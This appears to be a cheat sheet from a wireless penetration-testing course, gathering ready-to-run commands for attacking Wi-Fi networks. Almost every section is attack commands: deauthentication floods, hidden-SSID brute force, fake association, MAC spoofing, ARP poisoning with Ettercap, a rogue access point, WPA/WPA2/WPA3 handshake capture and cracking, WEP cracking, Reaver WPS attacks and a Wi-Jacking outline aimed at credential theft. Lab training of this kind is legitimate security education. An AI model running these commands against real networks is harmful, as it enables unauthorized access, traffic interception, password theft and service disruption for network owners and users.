# Cheat Sheet — Every Command in This Module

Copy-pasteable reference for every command demonstrated across files 05–10. Replace placeholder interfaces (`wlx00e02d886189`, `wlan0`, `wlan0mon`, `eth1`) and MAC addresses/BSSIDs with your own lab's values. See the individual topic files for full context, screenshots, and step-by-step narration.

> ⚠️ Authorized use only — see the disclaimer in [`README.md`](README.md).

## Table of Contents
- [Interface Setup](#interface-setup)
- [Discovery & Reconnaissance](#discovery--reconnaissance)
- [Hidden SSID Reveal](#hidden-ssid-reveal)
- [Denial of Service](#denial-of-service)
- [MITM & Association](#mitm--association)
- [MAC Spoofing](#mac-spoofing)
- [ARP Poisoning (Ettercap)](#arp-poisoning-ettercap)
- [Rogue AP (MANA Toolkit)](#rogue-ap-mana-toolkit)
- [WPA/WPA2 Handshake Capture & Crack](#wpawpa2-handshake-capture--crack)
- [WPA3 Handshake Capture & Crack](#wpa3-handshake-capture--crack)
- [WEP Cracking (Supplementary)](#wep-cracking-supplementary)
- [WPS / Reaver](#wps--reaver)
- [Wi-Jacking](#wi-jacking)

---

## Interface Setup

```bash
# Put adapter into monitor mode
airmon-ng start wlx00e02d886189

# If NetworkManager/wpa_supplicant interfere:
airmon-ng check kill

# Return to managed mode when done
airmon-ng stop wlx00e02d886189mon
```

## Discovery & Reconnaissance

```bash
# List all visible APs/clients
airodump-ng wlx00e02d886189

# Identify WPS-enabled APs
sudo wash -i wlan0
#   -i, --interface=<iface>   interface to capture packets
#   -a, --all                 show all APs, including WPS-disabled
#   -f, --file [F1 F2 ...]    read from capture files
#   -c, --channel=<num>       channel to listen on
#   -o, --out-file=<file>     write data to file
#   -n, --probes=<num>        max probes to send per AP
#   -D, --daemonize           run as daemon
#   -5, --5ghz                use 5 GHz channels
#   -s, --scan                scan mode
#   -u, --survey              survey mode (default)

# Fallback WPS discovery if Wash finds nothing:
airodump-ng wlan0mon
```

## Hidden SSID Reveal

```bash
airmon-ng start wlx00e02d886189
airodump-ng wlx00e02d886189                       # note "<length: 0>" ESSID
mdk3 wlx00e02d886189 p -b 1 -c 2 -t 1C:3B:F3:40:10:74
#   p           basic probing / ESSID brute-force mode
#   -b 1        beacon flood mode / EAPOL logoff test
#   -c 2        channel
#   -t <BSSID>  target AP
```

## Denial of Service

```bash
# Deauth flood (generic)
aireplay-ng --deauth 25 -h <TARGET_MAC> -b <AP_MAC> ath1

# Targeted deauth (short form, used throughout the WPA-cracking workflow)
aireplay-ng -0 11 -a <AP_BSSID> -c <CLIENT_MAC> wlx00e02d886189
```

## MITM & Association

```bash
# 1. Monitor mode
airmon-ng start eth1

# 2. Discover SSIDs
airodump-ng --ivs --write capture eth1

# 3. Deauth the client
aireplay-ng -0 5 -a 02:24:2B:CD:68:EE

# 4. Fake-associate your card with the target AP
aireplay-ng -1 0 -e SECRET_SSID -a 1e:64:51:3b:ff:3e -h 02:24:2B:CD:68:EE eth1
```

## MAC Spoofing

```bash
# Linux (legacy net-tools)
ifconfig wlan0 down
ifconfig wlan0 hw ether 02:25:ab:4c:2a:bc
ifconfig wlan0 up

# Linux (modern iproute2 equivalent)
ip link set wlan0 down
ip link set wlan0 address 02:25:ab:4c:2a:bc
ip link set wlan0 up
```

## ARP Poisoning (Ettercap)

```text
1. Sniff → Unified Sniffing → select primary interface → OK
2. Hosts → Scan for Hosts
3. Hosts → Hosts List
4. View → Connections
5. Select target IP(s) → Targets → Current targets
6. MITM → ARP poisoning → check "Sniff remote connections" → OK
```

## Rogue AP (MANA Toolkit)

```bash
# Edit /etc/mana-toolkit/hostapd-mana.conf: set interface, bssid, ssid
# Edit /usr/share/mana-toolkit/run-mana/start-nat-simple.sh: set phy= and upstream=

bash /usr/share/mana-toolkit/run-mana/start-nat-simple.sh
```

## WPA/WPA2 Handshake Capture & Crack

```bash
airmon-ng start wlx00e02d886189
airmon-ng check kill                                          # if needed

airodump-ng wlx00e02d886189                                   # find target BSSID/channel

airodump-ng --bssid 22:7F:AC:6D:E6:8B -c 1 -w ECCLabs wlx00e02d886189   # capture (leave running)

aireplay-ng -0 11 -a 22:7F:AC:6D:E6:8B -c EE:AB:46:A7:CF:18 wlx00e02d886189   # force handshake

aircrack-ng -a2 22:7F:AC:6D:E6:8B -w password.txt ECCLabs-01.cap        # crack offline
```

**Fern Wifi Cracker (GUI alternative):**
```bash
sudo fern-wifi-cracker
# Monitor Mode → Scan for Access Points → select target →
# Attack → wait for handshake capture → choose wordlist → Start WPA Attack
```

## WPA3 Handshake Capture & Crack

```bash
airmon-ng start <Wireless_Interface>
airodump-ng --bssid <BSSID> --channel <CH> --write capture wlan0mon
aireplay-ng --deauth 10 -a <BSSID> -c <Client_MAC> wlan0mon
hcxpcapngtool -o capture.hccapx <capture>.cap
hashcat -m 22000 capture.hccapx </path/to/wordlist.txt>
```

## WEP Cracking (Supplementary)

```bash
airmon-ng start wlan0
airodump-ng wlan0mon
airodump-ng --bssid <BSSID> -c <channel> -w wep_capture wlan0mon
aireplay-ng -1 0 -a <BSSID> wlan0mon           # fake authentication
aireplay-ng -3 -b <BSSID> wlan0mon             # ARP replay to farm IVs
aircrack-ng wep_capture-01.cap
```

## WPS / Reaver

```bash
airmon-ng start wlan0
wash -i mon0                          # or: airodump-ng wlan0mon (fallback)
reaver -i wlan0mon -b B4:75:0E:89:00:60 -vv
```

## Wi-Jacking

```bash
aireplay-ng -0 11 -a 22:7F:AC:6D:E6:8B -c EE:AB:46:A7:CF:18 wlx00e02d886189
# Followed by: hostapd-wpe KARMA attack, dnsmasq + Python malicious-URL
# injection, and XMLHttpRequest credential extraction — see
# 08-rogue-ap-evil-twin-krack-advanced-attacks.md for the full 7-step flow.
```

---
**See also:** [`cheatsheet-tools-and-defense.md`](cheatsheet-tools-and-defense.md) for the tool-purpose matrix and the one-page defensive checklist.
